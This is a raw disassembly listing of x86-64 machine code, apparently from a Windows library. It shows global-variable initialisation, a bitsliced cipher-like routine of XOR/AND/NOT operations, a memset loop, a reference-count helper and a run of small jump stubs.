    6d8cb611:	48 89 05 08 16 0f 00 	mov    %rax,0xf1608(%rip)        # 0x6d9bcc20
    6d8cb618:	48 89 05 31 16 0f 00 	mov    %rax,0xf1631(%rip)        # 0x6d9bcc50
    6d8cb61f:	48 89 05 5a 16 0f 00 	mov    %rax,0xf165a(%rip)        # 0x6d9bcc80
    6d8cb626:	48 8d 05 64 7a 00 00 	lea    0x7a64(%rip),%rax        # 0x6d8d3091
    6d8cb62d:	48 89 05 54 16 0f 00 	mov    %rax,0xf1654(%rip)        # 0x6d9bcc88
    6d8cb634:	48 8d 41 30          	lea    0x30(%rcx),%rax
    6d8cb638:	48 89 05 e9 18 0f 00 	mov    %rax,0xf18e9(%rip)        # 0x6d9bcf28
    6d8cb63f:	48 8b 05 5a d0 0e 00 	mov    0xed05a(%rip),%rax        # 0x6d9b86a0
    6d8cb646:	48 89 0d d3 18 0f 00 	mov    %rcx,0xf18d3(%rip)        # 0x6d9bcf20
    6d8cb64d:	c6 05 8c 15 0f 00 01 	movb   $0x1,0xf158c(%rip)        # 0x6d9bcbe0
    6d8cb654:	48 c7 05 89 15 0f 00 	movq   $0x28,0xf1589(%rip)        # 0x6d9bcbe8
    6d8cb65b:	28 00 00 00 
    6d8cb65f:	48 89 05 4a 16 0f 00 	mov    %rax,0xf164a(%rip)        # 0x6d9bccb0
    6d8cb666:	48 8d 05 2e 7a 00 00 	lea    0x7a2e(%rip),%rax        # 0x6d8d309b
    6d8cb66d:	48 89 05 44 16 0f 00 	mov    %rax,0xf1644(%rip)        # 0x6d9bccb8
    6d8cb674:	48 8d 41 60          	lea    0x60(%rcx),%rax
    6d8cb678:	48 89 05 b1 18 0f 00 	mov    %rax,0xf18b1(%rip)        # 0x6d9bcf30
    6d8cb67f:	48 8b 05 fa cf 0e 00 	mov    0xecffa(%rip),%rax        # 0x6d9b8680
    6d8cb686:	c6 05 83 15 0f 00 01 	movb   $0x1,0xf1583(%rip)        # 0x6d9bcc10
    6d8cb68d:	48 c7 05 80 15 0f 00 	movq   $0x30,0xf1580(%rip)        # 0x6d9bcc18
    6d8cb694:	30 00 00 00 
    6d8cb698:	c6 05 a1 15 0f 00 01 	movb   $0x1,0xf15a1(%rip)        # 0x6d9bcc40
    6d8cb69f:	48 89 05 3a 16 0f 00 	mov    %rax,0xf163a(%rip)        # 0x6d9bcce0
    6d8cb6a6:	48 8d 05 f9 79 00 00 	lea    0x79f9(%rip),%rax        # 0x6d8d30a6
    6d8cb6ad:	48 89 05 34 16 0f 00 	mov    %rax,0xf1634(%rip)        # 0x6d9bcce8
    6d8cb6b4:	48 8d 81 90 00 00 00 	lea    0x90(%rcx),%rax
    6d8cb6bb:	c6 05 ae 15 0f 00 01 	movb   $0x1,0xf15ae(%rip)        # 0x6d9bcc70
    6d8cb6c2:	48 8d 0d b7 13 0f 00 	lea    0xf13b7(%rip),%rcx        # 0x6d9bca80
    6d8cb6c9:	48 c7 05 74 15 0f 00 	movq   $0x38,0xf1574(%rip)        # 0x6d9bcc48
    6d8cb6d0:	38 00 00 00 
    6d8cb6d4:	48 c7 05 99 15 0f 00 	movq   $0x40,0xf1599(%rip)        # 0x6d9bcc78
    6d8cb6db:	40 00 00 00 
    6d8cb6df:	c6 05 ba 15 0f 00 01 	movb   $0x1,0xf15ba(%rip)        # 0x6d9bcca0
    6d8cb6e6:	48 c7 05 b7 15 0f 00 	movq   $0x48,0xf15b7(%rip)        # 0x6d9bcca8
    6d8cb6ed:	48 00 00 00 
    6d8cb6f1:	c6 05 d8 15 0f 00 01 	movb   $0x1,0xf15d8(%rip)        # 0x6d9bccd0
    6d8cb6f8:	48 c7 05 d5 15 0f 00 	movq   $0x4c,0xf15d5(%rip)        # 0x6d9bccd8
    6d8cb6ff:	4c 00 00 00 
    6d8cb703:	48 89 05 2e 18 0f 00 	mov    %rax,0xf182e(%rip)        # 0x6d9bcf38
    6d8cb70a:	31 c0                	xor    %eax,%eax
    6d8cb70c:	48 c7 05 c1 38 10 00 	movq   $0x0,0x1038c1(%rip)        # 0x6d9cefd8
    6d8cb713:	00 00 00 00 
    6d8cb717:	48 c7 05 9e 38 10 00 	movq   $0x1,0x10389e(%rip)        # 0x6d9cefc0
    6d8cb71e:	01 00 00 00 
    6d8cb722:	48 c7 05 9b 38 10 00 	movq   $0x1,0x10389b(%rip)        # 0x6d9cefc8
    6d8cb729:	01 00 00 00 
    6d8cb72d:	66 c7 05 9a 38 10 00 	movw   $0x30e,0x10389a(%rip)        # 0x6d9cefd0
    6d8cb734:	0e 03 
    6d8cb736:	4d 8b 04 c1          	mov    (%r9,%rax,8),%r8
    6d8cb73a:	48 89 42 08          	mov    %rax,0x8(%rdx)
    6d8cb73e:	48 89 14 c1          	mov    %rdx,(%rcx,%rax,8)
    6d8cb742:	48 ff c0             	inc    %rax
    6d8cb745:	48 83 c2 30          	add    $0x30,%rdx
    6d8cb749:	c6 42 d0 01          	movb   $0x1,-0x30(%rdx)
    6d8cb74d:	4c 89 42 e8          	mov    %r8,-0x18(%rdx)
    6d8cb751:	48 83 f8 07          	cmp    $0x7,%rax
    6d8cb755:	75 df                	jne    0x6d8cb736
    6d8cb757:	48 8d 05 22 17 0f 00 	lea    0xf1722(%rip),%rax        # 0x6d9bce80
    6d8cb75e:	c6 05 1b 17 0f 00 02 	movb   $0x2,0xf171b(%rip)        # 0x6d9bce80
    6d8cb765:	48 89 05 74 38 10 00 	mov    %rax,0x103874(%rip)        # 0x6d9cefe0
    6d8cb76c:	48 8d 05 4d 38 10 00 	lea    0x10384d(%rip),%rax        # 0x6d9cefc0
    6d8cb773:	48 89 05 9e 38 10 00 	mov    %rax,0x10389e(%rip)        # 0x6d9cf018
    6d8cb77a:	48 8d 05 2f 17 0f 00 	lea    0xf172f(%rip),%rax        # 0x6d9bceb0
    6d8cb781:	48 89 05 98 38 10 00 	mov    %rax,0x103898(%rip)        # 0x6d9cf020
    6d8cb788:	48 8d 05 71 38 10 00 	lea    0x103871(%rip),%rax        # 0x6d9cf000
    6d8cb78f:	48 89 05 7a 15 0f 00 	mov    %rax,0xf157a(%rip)        # 0x6d9bcd10
    6d8cb796:	48 8d 05 12 79 00 00 	lea    0x7912(%rip),%rax        # 0x6d8d30af
    6d8cb79d:	48 89 05 74 15 0f 00 	mov    %rax,0xf1574(%rip)        # 0x6d9bcd18
    6d8cb7a4:	48 8d 05 35 17 0f 00 	lea    0xf1735(%rip),%rax        # 0x6d9bcee0
    6d8cb7ab:	48 89 05 36 13 0f 00 	mov    %rax,0xf1336(%rip)        # 0x6d9bcae8
    6d8cb7b2:	48 8d 05 07 13 0f 00 	lea    0xf1307(%rip),%rax        # 0x6d9bcac0
    6d8cb7b9:	48 89 05 a0 38 10 00 	mov    %rax,0x1038a0(%rip)        # 0x6d9cf060
    6d8cb7c0:	48 8d 05 79 38 10 00 	lea    0x103879(%rip),%rax        # 0x6d9cf040
    6d8cb7c7:	48 89 05 ca 38 10 00 	mov    %rax,0x1038ca(%rip)        # 0x6d9cf098
    6d8cb7ce:	48 8d 05 02 f2 ff ff 	lea    -0xdfe(%rip),%rax        # 0x6d8ca9d7
    6d8cb7d5:	48 c7 05 c0 16 0f 00 	movq   $0x7,0xf16c0(%rip)        # 0x6d9bcea0
    6d8cb7dc:	07 00 00 00 
    6d8cb7e0:	48 89 0d c1 16 0f 00 	mov    %rcx,0xf16c1(%rip)        # 0x6d9bcea8
    6d8cb7e7:	48 c7 05 0e 38 10 00 	movq   $0x1,0x10380e(%rip)        # 0x6d9cf000
    6d8cb7ee:	01 00 00 00 
    6d8cb7f2:	48 c7 05 0b 38 10 00 	movq   $0x1,0x10380b(%rip)        # 0x6d9cf008
    6d8cb7f9:	01 00 00 00 
    6d8cb7fd:	66 c7 05 0a 38 10 00 	movw   $0x313,0x10380a(%rip)        # 0x6d9cf010
    6d8cb804:	13 03 
    6d8cb806:	48 c7 05 bf 16 0f 00 	movq   $0x0,0xf16bf(%rip)        # 0x6d9bced0
    6d8cb80d:	00 00 00 00 
    6d8cb811:	c6 05 98 16 0f 00 00 	movb   $0x0,0xf1698(%rip)        # 0x6d9bceb0
    6d8cb818:	c6 05 e1 14 0f 00 01 	movb   $0x1,0xf14e1(%rip)        # 0x6d9bcd00
    6d8cb81f:	48 c7 05 de 14 0f 00 	movq   $0x4d,0xf14de(%rip)        # 0x6d9bcd08
    6d8cb826:	4d 00 00 00 
    6d8cb82a:	48 c7 05 ab 12 0f 00 	movq   $0xc,0xf12ab(%rip)        # 0x6d9bcae0
    6d8cb831:	0c 00 00 00 
    6d8cb835:	c6 05 84 12 0f 00 02 	movb   $0x2,0xf1284(%rip)        # 0x6d9bcac0
    6d8cb83c:	48 c7 05 39 38 10 00 	movq   $0x8,0x103839(%rip)        # 0x6d9cf080
    6d8cb843:	08 00 00 00 
    6d8cb847:	48 c7 05 36 38 10 00 	movq   $0x8,0x103836(%rip)        # 0x6d9cf088
    6d8cb84e:	08 00 00 00 
    6d8cb852:	c6 05 37 38 10 00 16 	movb   $0x16,0x103837(%rip)        # 0x6d9cf090
    6d8cb859:	48 89 05 50 38 10 00 	mov    %rax,0x103850(%rip)        # 0x6d9cf0b0
    6d8cb860:	c3                   	ret
    6d8cb861:	90                   	nop
    6d8cb862:	90                   	nop
    6d8cb863:	90                   	nop
    6d8cb864:	90                   	nop
    6d8cb865:	90                   	nop
    6d8cb866:	90                   	nop
    6d8cb867:	90                   	nop
    6d8cb868:	90                   	nop
    6d8cb869:	90                   	nop
    6d8cb86a:	90                   	nop
    6d8cb86b:	90                   	nop
    6d8cb86c:	90                   	nop
    6d8cb86d:	90                   	nop
    6d8cb86e:	90                   	nop
    6d8cb86f:	90                   	nop
    6d8cb870:	c3                   	ret
    6d8cb871:	41 57                	push   %r15
    6d8cb873:	41 56                	push   %r14
    6d8cb875:	41 55                	push   %r13
    6d8cb877:	41 54                	push   %r12
    6d8cb879:	55                   	push   %rbp
    6d8cb87a:	57                   	push   %rdi
    6d8cb87b:	56                   	push   %rsi
    6d8cb87c:	53                   	push   %rbx
    6d8cb87d:	48 83 ec 78          	sub    $0x78,%rsp
    6d8cb881:	48 8b 71 20          	mov    0x20(%rcx),%rsi
    6d8cb885:	48 8b 51 38          	mov    0x38(%rcx),%rdx
    6d8cb889:	4c 8b 41 10          	mov    0x10(%rcx),%r8
    6d8cb88d:	4c 8b 59 30          	mov    0x30(%rcx),%r11
    6d8cb891:	4c 8b 79 28          	mov    0x28(%rcx),%r15
    6d8cb895:	48 89 f7             	mov    %rsi,%rdi
    6d8cb898:	4c 8b 11             	mov    (%rcx),%r10
    6d8cb89b:	48 89 d3             	mov    %rdx,%rbx
    6d8cb89e:	48 89 d5             	mov    %rdx,%rbp
    6d8cb8a1:	4c 31 c7             	xor    %r8,%rdi
    6d8cb8a4:	48 8b 41 08          	mov    0x8(%rcx),%rax
    6d8cb8a8:	48 31 f3             	xor    %rsi,%rbx
    6d8cb8ab:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
    6d8cb8b0:	48 89 d7             	mov    %rdx,%rdi
    6d8cb8b3:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
    6d8cb8b8:	4d 31 df             	xor    %r11,%r15
    6d8cb8bb:	4c 31 c7             	xor    %r8,%rdi
    6d8cb8be:	48 8b 5c 24 18       	mov    0x18(%rsp),%rbx
    6d8cb8c3:	4d 31 fa             	xor    %r15,%r10
    6d8cb8c6:	48 89 3c 24          	mov    %rdi,(%rsp)
    6d8cb8ca:	48 89 d7             	mov    %rdx,%rdi
    6d8cb8cd:	4c 31 d7             	xor    %r10,%rdi
    6d8cb8d0:	48 31 c5             	xor    %rax,%rbp
    6d8cb8d3:	4c 31 d6             	xor    %r10,%rsi
    6d8cb8d6:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
    6d8cb8db:	48 8b 3c 24          	mov    (%rsp),%rdi
    6d8cb8df:	49 89 ec             	mov    %rbp,%r12
    6d8cb8e2:	48 31 eb             	xor    %rbp,%rbx
    6d8cb8e5:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
    6d8cb8ea:	4c 89 fe             	mov    %r15,%rsi
    6d8cb8ed:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
    6d8cb8f2:	48 89 c3             	mov    %rax,%rbx
    6d8cb8f5:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
    6d8cb8fa:	48 f7 d0             	not    %rax
    6d8cb8fd:	4c 31 d3             	xor    %r10,%rbx
    6d8cb900:	4c 33 71 18          	xor    0x18(%rcx),%r14
    6d8cb904:	48 31 df             	xor    %rbx,%rdi
    6d8cb907:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
    6d8cb90c:	48 8b 19             	mov    (%rcx),%rbx
    6d8cb90f:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
    6d8cb914:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
    6d8cb919:	4d 31 f0             	xor    %r14,%r8
    6d8cb91c:	4d 31 de             	xor    %r11,%r14
    6d8cb91f:	4c 8b 5c 24 18       	mov    0x18(%rsp),%r11
    6d8cb924:	4c 31 c3             	xor    %r8,%rbx
    6d8cb927:	4d 89 f1             	mov    %r14,%r9
    6d8cb92a:	4c 31 c6             	xor    %r8,%rsi
    6d8cb92d:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
    6d8cb932:	48 8b 19             	mov    (%rcx),%rbx
    6d8cb935:	49 f7 d1             	not    %r9
    6d8cb938:	4c 31 f7             	xor    %r14,%rdi
    6d8cb93b:	4c 23 4c 24 20       	and    0x20(%rsp),%r9
    6d8cb940:	48 89 74 24 08       	mov    %rsi,0x8(%rsp)
    6d8cb945:	48 31 fe             	xor    %rdi,%rsi
    6d8cb948:	49 31 ff             	xor    %rdi,%r15
    6d8cb94b:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
    6d8cb950:	49 21 f3             	and    %rsi,%r11
    6d8cb953:	4d 21 fc             	and    %r15,%r12
    6d8cb956:	48 89 74 24 60       	mov    %rsi,0x60(%rsp)
    6d8cb95b:	48 31 fb             	xor    %rdi,%rbx
    6d8cb95e:	48 8b 7c 24 28       	mov    0x28(%rsp),%rdi
    6d8cb963:	4d 31 cb             	xor    %r9,%r11
    6d8cb966:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
    6d8cb96b:	48 8b 1c 24          	mov    (%rsp),%rbx
    6d8cb96f:	4d 89 dd             	mov    %r11,%r13
    6d8cb972:	48 23 5c 24 08       	and    0x8(%rsp),%rbx
    6d8cb977:	4c 8b 5c 24 48       	mov    0x48(%rsp),%r11
    6d8cb97c:	4c 23 5c 24 50       	and    0x50(%rsp),%r11
    6d8cb981:	4c 21 c7             	and    %r8,%rdi
    6d8cb984:	49 31 fe             	xor    %rdi,%r14
    6d8cb987:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
    6d8cb98c:	4c 31 cb             	xor    %r9,%rbx
    6d8cb98f:	48 23 31             	and    (%rcx),%rsi
    6d8cb992:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
    6d8cb997:	4d 31 f3             	xor    %r14,%r11
    6d8cb99a:	4c 8b 31             	mov    (%rcx),%r14
    6d8cb99d:	4d 31 eb             	xor    %r13,%r11
    6d8cb9a0:	48 33 34 24          	xor    (%rsp),%rsi
    6d8cb9a4:	4c 21 d0             	and    %r10,%rax
    6d8cb9a7:	4c 31 fa             	xor    %r15,%rdx
    6d8cb9aa:	4c 23 4c 24 58       	and    0x58(%rsp),%r9
    6d8cb9af:	48 31 e8             	xor    %rbp,%rax
    6d8cb9b2:	48 33 74 24 08       	xor    0x8(%rsp),%rsi
    6d8cb9b7:	4c 31 f8             	xor    %r15,%rax
    6d8cb9ba:	4c 31 e0             	xor    %r12,%rax
    6d8cb9bd:	49 31 d4             	xor    %rdx,%r12
    6d8cb9c0:	4c 31 e8             	xor    %r13,%rax
    6d8cb9c3:	4d 31 cc             	xor    %r9,%r12
    6d8cb9c6:	48 89 c2             	mov    %rax,%rdx
    6d8cb9c9:	48 31 fe             	xor    %rdi,%rsi
    6d8cb9cc:	4d 89 e1             	mov    %r12,%r9
    6d8cb9cf:	4d 89 dc             	mov    %r11,%r12
    6d8cb9d2:	49 31 d9             	xor    %rbx,%r9
    6d8cb9d5:	48 31 de             	xor    %rbx,%rsi
    6d8cb9d8:	49 21 c3             	and    %rax,%r11
    6d8cb9db:	49 31 f4             	xor    %rsi,%r12
    6d8cb9de:	4c 89 cf             	mov    %r9,%rdi
    6d8cb9e1:	4c 31 ca             	xor    %r9,%rdx
    6d8cb9e4:	4c 31 df             	xor    %r11,%rdi
    6d8cb9e7:	4c 89 e3             	mov    %r12,%rbx
    6d8cb9ea:	48 21 fb             	and    %rdi,%rbx
    6d8cb9ed:	48 31 f3             	xor    %rsi,%rbx
    6d8cb9f0:	4c 31 de             	xor    %r11,%rsi
    6d8cb9f3:	48 21 f2             	and    %rsi,%rdx
    6d8cb9f6:	4c 89 ce             	mov    %r9,%rsi
    6d8cb9f9:	49 31 d3             	xor    %rdx,%r11
    6d8cb9fc:	48 31 d6             	xor    %rdx,%rsi
    6d8cb9ff:	48 89 da             	mov    %rbx,%rdx
    6d8cba02:	4d 21 d9             	and    %r11,%r9
    6d8cba05:	48 31 f0             	xor    %rsi,%rax
    6d8cba08:	49 89 f5             	mov    %rsi,%r13
    6d8cba0b:	4c 31 cf             	xor    %r9,%rdi
    6d8cba0e:	4c 31 c8             	xor    %r9,%rax
    6d8cba11:	49 89 d9             	mov    %rbx,%r9
    6d8cba14:	49 89 fb             	mov    %rdi,%r11
    6d8cba17:	49 31 f1             	xor    %rsi,%r9
    6d8cba1a:	49 21 db             	and    %rbx,%r11
    6d8cba1d:	4d 31 e3             	xor    %r12,%r11
    6d8cba20:	49 89 c4             	mov    %rax,%r12
    6d8cba23:	4d 31 dc             	xor    %r11,%r12
    6d8cba26:	4c 31 da             	xor    %r11,%rdx
    6d8cba29:	49 21 f6             	and    %rsi,%r14
    6d8cba2c:	4c 89 74 24 68       	mov    %r14,0x68(%rsp)
    6d8cba31:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
    6d8cba36:	4c 89 e7             	mov    %r12,%rdi
    6d8cba39:	49 21 d7             	and    %rdx,%r15
    6d8cba3c:	4c 31 cf             	xor    %r9,%rdi
    6d8cba3f:	49 31 c5             	xor    %rax,%r13
    6d8cba42:	4d 21 da             	and    %r11,%r10
    6d8cba45:	4c 23 5c 24 40       	and    0x40(%rsp),%r11
    6d8cba4a:	4d 21 e8             	and    %r13,%r8
    6d8cba4d:	4c 23 6c 24 28       	and    0x28(%rsp),%r13
    6d8cba52:	4d 31 f8             	xor    %r15,%r8
    6d8cba55:	49 21 de             	and    %rbx,%r14
    6d8cba58:	48 23 5c 24 38       	and    0x38(%rsp),%rbx
    6d8cba5d:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
    6d8cba62:	4c 8b 74 24 60       	mov    0x60(%rsp),%r14
    6d8cba67:	4c 33 5c 24 58       	xor    0x58(%rsp),%r11
    6d8cba6c:	49 21 fe             	and    %rdi,%r14
    6d8cba6f:	48 23 7c 24 18       	and    0x18(%rsp),%rdi
    6d8cba74:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
    6d8cba79:	4c 89 74 24 60       	mov    %r14,0x60(%rsp)
    6d8cba7e:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
    6d8cba83:	49 21 c6             	and    %rax,%r14
    6d8cba86:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
    6d8cba8b:	49 89 ee             	mov    %rbp,%r14
    6d8cba8e:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
    6d8cba93:	49 21 d6             	and    %rdx,%r14
    6d8cba96:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
    6d8cba9b:	4c 33 6c 24 48       	xor    0x48(%rsp),%r13
    6d8cbaa0:	4c 31 f5             	xor    %r14,%rbp
    6d8cbaa3:	4c 21 ca             	and    %r9,%rdx
    6d8cbaa6:	4c 23 4c 24 10       	and    0x10(%rsp),%r9
    6d8cbaab:	4c 31 c5             	xor    %r8,%rbp
    6d8cbaae:	4d 89 d0             	mov    %r10,%r8
    6d8cbab1:	48 31 fa             	xor    %rdi,%rdx
    6d8cbab4:	48 31 eb             	xor    %rbp,%rbx
    6d8cbab7:	49 31 d0             	xor    %rdx,%r8
    6d8cbaba:	4d 31 c5             	xor    %r8,%r13
    6d8cbabd:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
    6d8cbac2:	4d 31 f9             	xor    %r15,%r9
    6d8cbac5:	4c 8b 7c 24 08       	mov    0x8(%rsp),%r15
    6d8cbaca:	4c 33 4c 24 60       	xor    0x60(%rsp),%r9
    6d8cbacf:	4d 21 e7             	and    %r12,%r15
    6d8cbad2:	4c 33 7c 24 60       	xor    0x60(%rsp),%r15
    6d8cbad7:	4d 31 ca             	xor    %r9,%r10
    6d8cbada:	4d 31 c7             	xor    %r8,%r15
    6d8cbadd:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
    6d8cbae2:	4c 31 fb             	xor    %r15,%rbx
    6d8cbae5:	48 23 44 24 50       	and    0x50(%rsp),%rax
    6d8cbaea:	4d 31 de             	xor    %r11,%r14
    6d8cbaed:	48 31 ea             	xor    %rbp,%rdx
    6d8cbaf0:	4d 31 f7             	xor    %r14,%r15
    6d8cbaf3:	49 31 d3             	xor    %rdx,%r11
    6d8cbaf6:	49 f7 d7             	not    %r15
    6d8cbaf9:	49 f7 d3             	not    %r11
    6d8cbafc:	4c 31 e8             	xor    %r13,%rax
    6d8cbaff:	4d 31 cd             	xor    %r9,%r13
    6d8cbb02:	4d 89 d1             	mov    %r10,%r9
    6d8cbb05:	49 31 c0             	xor    %rax,%r8
    6d8cbb08:	4c 89 69 38          	mov    %r13,0x38(%rcx)
    6d8cbb0c:	48 23 74 24 30       	and    0x30(%rsp),%rsi
    6d8cbb11:	4d 31 c1             	xor    %r8,%r9
    6d8cbb14:	4c 89 41 20          	mov    %r8,0x20(%rcx)
    6d8cbb18:	48 33 74 24 48       	xor    0x48(%rsp),%rsi
    6d8cbb1d:	49 f7 d1             	not    %r9
    6d8cbb20:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
    6d8cbb25:	4c 89 79 08          	mov    %r15,0x8(%rcx)
    6d8cbb29:	4c 89 49 30          	mov    %r9,0x30(%rcx)
    6d8cbb2d:	4c 8b 0c 24          	mov    (%rsp),%r9
    6d8cbb31:	4c 33 44 24 58       	xor    0x58(%rsp),%r8
    6d8cbb36:	4c 89 19             	mov    %r11,(%rcx)
    6d8cbb39:	4d 21 e1             	and    %r12,%r9
    6d8cbb3c:	4c 31 cf             	xor    %r9,%rdi
    6d8cbb3f:	4c 31 c0             	xor    %r8,%rax
    6d8cbb42:	4c 31 d7             	xor    %r10,%rdi
    6d8cbb45:	48 89 41 18          	mov    %rax,0x18(%rcx)
    6d8cbb49:	48 31 df             	xor    %rbx,%rdi
    6d8cbb4c:	48 31 f3             	xor    %rsi,%rbx
    6d8cbb4f:	48 f7 d7             	not    %rdi
    6d8cbb52:	48 89 59 10          	mov    %rbx,0x10(%rcx)
    6d8cbb56:	48 89 79 28          	mov    %rdi,0x28(%rcx)
    6d8cbb5a:	48 83 c4 78          	add    $0x78,%rsp
    6d8cbb5e:	5b                   	pop    %rbx
    6d8cbb5f:	5e                   	pop    %rsi
    6d8cbb60:	5f                   	pop    %rdi
    6d8cbb61:	5d                   	pop    %rbp
    6d8cbb62:	41 5c                	pop    %r12
    6d8cbb64:	41 5d                	pop    %r13
    6d8cbb66:	41 5e                	pop    %r14
    6d8cbb68:	41 5f                	pop    %r15
    6d8cbb6a:	c3                   	ret
    6d8cbb6b:	57                   	push   %rdi
    6d8cbb6c:	31 c0                	xor    %eax,%eax
    6d8cbb6e:	49 89 c8             	mov    %rcx,%r8
    6d8cbb71:	89 d1                	mov    %edx,%ecx
    6d8cbb73:	4c 89 c7             	mov    %r8,%rdi
    6d8cbb76:	f3 aa                	rep stos %al,(%rdi)
    6d8cbb78:	5f                   	pop    %rdi
    6d8cbb79:	c3                   	ret
    6d8cbb7a:	56                   	push   %rsi
    6d8cbb7b:	53                   	push   %rbx
    6d8cbb7c:	48 83 ec 28          	sub    $0x28,%rsp
    6d8cbb80:	48 85 d2             	test   %rdx,%rdx
    6d8cbb83:	48 89 ce             	mov    %rcx,%rsi
    6d8cbb86:	48 89 d3             	mov    %rdx,%rbx
    6d8cbb89:	74 05                	je     0x6d8cbb90
    6d8cbb8b:	48 83 42 f0 08       	addq   $0x8,-0x10(%rdx)
    6d8cbb90:	48 8b 0e             	mov    (%rsi),%rcx
    6d8cbb93:	48 85 c9             	test   %rcx,%rcx
    6d8cbb96:	74 26                	je     0x6d8cbbbe
    6d8cbb98:	48 8b 41 f0          	mov    -0x10(%rcx),%rax
    6d8cbb9c:	48 8d 51 f0          	lea    -0x10(%rcx),%rdx
    6d8cbba0:	48 83 e8 08          	sub    $0x8,%rax
    6d8cbba4:	48 83 f8 07          	cmp    $0x7,%rax
    6d8cbba8:	48 89 41 f0          	mov    %rax,-0x10(%rcx)
    6d8cbbac:	77 10                	ja     0x6d8cbbbe
    6d8cbbae:	48 8b 0d db cc 0e 00 	mov    0xeccdb(%rip),%rcx        # 0x6d9b8890
    6d8cbbb5:	48 83 c1 18          	add    $0x18,%rcx
    6d8cbbb9:	e8 ad 71 ff ff       	call   0x6d8c2d6b
    6d8cbbbe:	48 89 1e             	mov    %rbx,(%rsi)
    6d8cbbc1:	48 83 c4 28          	add    $0x28,%rsp
    6d8cbbc5:	5b                   	pop    %rbx
    6d8cbbc6:	5e                   	pop    %rsi
    6d8cbbc7:	c3                   	ret
    6d8cbbc8:	48 83 ec 28          	sub    $0x28,%rsp
    6d8cbbcc:	e8 24 5f ff ff       	call   0x6d8c1af5
    6d8cbbd1:	e8 7a c6 ff ff       	call   0x6d8c8250
    6d8cbbd6:	e8 85 c8 ff ff       	call   0x6d8c8460
    6d8cbbdb:	e8 c0 cf ff ff       	call   0x6d8c8ba0
    6d8cbbe0:	e8 1a d0 ff ff       	call   0x6d8c8bff
    6d8cbbe5:	90                   	nop
    6d8cbbe6:	48 83 c4 28          	add    $0x28,%rsp
    6d8cbbea:	e9 6f e0 ff ff       	jmp    0x6d8c9c5e
    6d8cbbef:	48 8b 0d ba 35 10 00 	mov    0x1035ba(%rip),%rcx        # 0x6d9cf1b0
    6d8cbbf6:	31 d2                	xor    %edx,%edx
    6d8cbbf8:	e9 f9 78 ff ff       	jmp    0x6d8c34f6
    6d8cbbfd:	48 8b 0d 24 36 10 00 	mov    0x103624(%rip),%rcx        # 0x6d9cf228
    6d8cbc04:	31 d2                	xor    %edx,%edx
    6d8cbc06:	e9 eb 78 ff ff       	jmp    0x6d8c34f6
    6d8cbc0b:	48 8b 0d a6 35 10 00 	mov    0x1035a6(%rip),%rcx        # 0x6d9cf1b8
    6d8cbc12:	31 d2                	xor    %edx,%edx
    6d8cbc14:	e9 dd 78 ff ff       	jmp    0x6d8c34f6
    6d8cbc19:	48 8b 0d 80 35 10 00 	mov    0x103580(%rip),%rcx        # 0x6d9cf1a0
    6d8cbc20:	31 d2                	xor    %edx,%edx
    6d8cbc22:	e9 cf 78 ff ff       	jmp    0x6d8c34f6
    6d8cbc27:	48 8b 0d 3a 35 10 00 	mov    0x10353a(%rip),%rcx        # 0x6d9cf168
    6d8cbc2e:	31 d2                	xor    %edx,%edx
    6d8cbc30:	e9 c1 78 ff ff       	jmp    0x6d8c34f6
    6d8cbc35:	48 8b 0d 14 36 10 00 	mov    0x103614(%rip),%rcx        # 0x6d9cf250
    6d8cbc3c:	31 d2                	xor    %edx,%edx
    6d8cbc3e:	e9 b3 78 ff ff       	jmp    0x6d8c34f6
    6d8cbc43:	48 8b 0d 16 36 10 00 	mov    0x103616(%rip),%rcx        # 0x6d9cf260
    6d8cbc4a:	31 d2                	xor    %edx,%edx
    6d8cbc4c:	e9 a5 78 ff ff       	jmp    0x6d8c34f6
    6d8cbc51:	48 8b 0d c8 35 10 00 	mov    0x1035c8(%rip),%rcx        # 0x6d9cf220
    6d8cbc58:	31 d2                	xor    %edx,%edx
    6d8cbc5a:	e9 97 78 ff ff       	jmp    0x6d8c34f6
    6d8cbc5f:	48 8b 0d 5a 34 10 00 	mov    0x10345a(%rip),%rcx        # 0x6d9cf0c0
    6d8cbc66:	31 d2                	xor    %edx,%edx
    6d8cbc68:	e9 89 78 ff ff       	jmp    0x6d8c34f6
    6d8cbc6d:	48 8b 0d 4c 35 10 00 	mov    0x10354c(%rip),%rcx        # 0x6d9cf1c0
    6d8cbc74:	31 d2                	xor    %edx,%edx
    6d8cbc76:	e9 7b 78 ff ff       	jmp    0x6d8c34f6
    6d8cbc7b:	48 8b 0d de 34 10 00 	mov    0x1034de(%rip),%rcx        # 0x6d9cf160
    6d8cbc82:	31 d2                	xor    %edx,%edx
    6d8cbc84:	e9 6d 78 ff ff       	jmp    0x6d8c34f6
    6d8cbc89:	48 8b 0d 38 34 10 00 	mov    0x103438(%rip),%rcx        # 0x6d9cf0c8
    6d8cbc90:	31 d2                	xor    %edx,%edx
    6d8cbc92:	e9 5f 78 ff ff       	jmp    0x6d8c34f6
    6d8cbc97:	48 8b 0d ca 35 10 00 	mov    0x1035ca(%rip),%rcx        # 0x6d9cf268
    6d8cbc9e:	31 d2                	xor    %edx,%edx
    6d8cbca0:	e9 51 78 ff ff       	jmp    0x6d8c34f6
    6d8cbca5:	48 8b 0d 94 34 10 00 	mov    0x103494(%rip),%rcx        # 0x6d9cf140
    6d8cbcac:	31 d2                	xor    %edx,%edx
